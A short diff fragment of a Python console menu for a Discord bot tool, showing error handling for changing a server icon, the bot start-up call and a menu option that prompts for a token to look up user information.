+                                            print("Permission error when changing the server icon.")
+                                        except discord.HTTPException as e:
+                                            print(f"HTTP exception when changing server icon: {e}")
+
+                                    # Запуск бота
+                                    bot.run(TOKEN)
+                            elif choice_page_4 == '8':
+                                token = input(Fore.CYAN + f"Enter your token: ")
+                                get_info_user(token)
+                                input("Press enter to return to the main menu")
+                            elif choice_page_4 == '0':
+                                break
                     elif choice_page_3 == '0':
                         break
             elif choice_page_2 == '3':
